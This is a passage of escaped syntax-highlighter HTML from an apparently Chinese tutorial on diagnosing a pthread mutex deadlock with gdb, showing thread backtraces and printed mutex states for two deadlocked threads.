&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0779d467689681-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0779d467689681-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0779d467689681-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0779d467689681-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0779d467689681-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0779d467689681-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0779d467689681-11&quot;&gt;11&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0779d467689681-1&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0779d467689681-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Switching &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x41e37940&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;LWP&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6722&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#0  0x0000003d1a80d4c4 in &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0779d467689681-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;__lll_lock_wait&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lib64&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;libpthread&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0779d467689681-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0779d467689681-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#0  0x0000003d1a80d4c4 in __lll_lock_wait () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0779d467689681-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#1  0x0000003d1a808e1a in _L_lock_1034 () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0779d467689681-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#2  0x0000003d1a808cdc in pthread_mutex_lock () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0779d467689681-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#3  0x0000000000400a9b in func1 () at lock.cpp:18 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0779d467689681-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#4  0x0000000000400ad7 in thread1 (arg=0x0) at lock.cpp:43 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0779d467689681-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#5  0x0000003d1a80673d in start_thread () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0779d467689681-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#6  0x0000003d19cd40cd in clone () from /lib64/libc.so.6&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0017 seconds] --&gt;

&lt;/div&gt;
&lt;h5 id=&quot;listing7&quot;&gt;清单 8. 线程 4 和线程 5 的输出&lt;/h5&gt;
&lt;div&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a973a077a1640481434&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
 (gdb) f 3 
 #3  0x0000000000400a9b in func1 () at lock.cpp:18 
 18          pthread_mutex_lock(&amp;amp;mutex2); 
 (gdb) thread 4 
 [Switching to thread 4 (Thread 0x42838940 (LWP 6723))]#0  0x0000003d1a80d4c4 in 
 __lll_lock_wait () from /lib64/libpthread.so.0 
 (gdb) f 3 
 #3  0x0000000000400a17 in func2 () at lock.cpp:31 
 31          pthread_mutex_lock(&amp;amp;mutex1); 
 (gdb) p mutex1 
 $1 = {__data = {__lock = 2, __count = 0, __owner = 6722, __nusers = 1, __kind = 0, 
 __spins = 0, __list = {__prev = 0x0, __next = 0x0}}, 
  __size = &quot;\002\000\000\000\000\000\000\000B\032\000\000\001&quot;, &#39;\000&#39;
 &amp;lt;repeats 26 times&amp;gt;, __align = 2} 
 (gdb) p mutex3 
 $2 = {__data = {__lock = 0, __count = 0, __owner = 0, __nusers = 0, 
 __kind = 0, __spins = 0, __list = {__prev = 0x0, __next = 0x0}}, 
 __size = &#39;\000&#39; &amp;lt;repeats 39 times&amp;gt;, __align = 0} 
 (gdb) p mutex2 
 $3 = {__data = {__lock = 2, __count = 0, __owner = 6723, __nusers = 1, 
 __kind = 0, __spins = 0, __list = {__prev = 0x0, __next = 0x0}}, 
  __size = &quot;\002\000\000\000\000\000\000\000C\032\000\000\001&quot;, &#39;\000&#39;
 &amp;lt;repeats 26 times&amp;gt;, __align = 2} 
 (gdb)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a077a1640481434-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a077a1640481434-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a077a1640481434-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a077a1640481434-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a077a1640481434-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a077a1640481434-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a077a1640481434-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a077a1640481434-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a077a1640481434-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a077a1640481434-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a077a1640481434-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a077a1640481434-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a077a1640481434-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a077a1640481434-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a077a1640481434-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a077a1640481434-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a077a1640481434-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a077a1640481434-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a077a1640481434-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a077a1640481434-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a077a1640481434-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a077a1640481434-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a077a1640481434-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a077a1640481434-24&quot;&gt;24&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a077a1640481434-1&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a077a1640481434-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#3  0x0000000000400a9b in func1 () at lock.cpp:18 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a077a1640481434-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;18&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_mutex_lock&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mutex2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a077a1640481434-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a077a1640481434-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Switching &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x42838940&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;LWP&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6723&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#0  0x0000003d1a80d4c4 in &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a077a1640481434-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;__lll_lock_wait&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lib64&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;libpthread&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a077a1640481434-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a077a1640481434-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#3  0x0000000000400a17 in func2 () at lock.cpp:31 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a077a1640481434-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_mutex_lock&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mutex1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a077a1640481434-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mutex1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a077a1640481434-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__data&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__lock&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__count&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__owner&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6722&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__nusers&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__kind&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a077a1640481434-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__spins&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__list&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__prev&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__next&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span 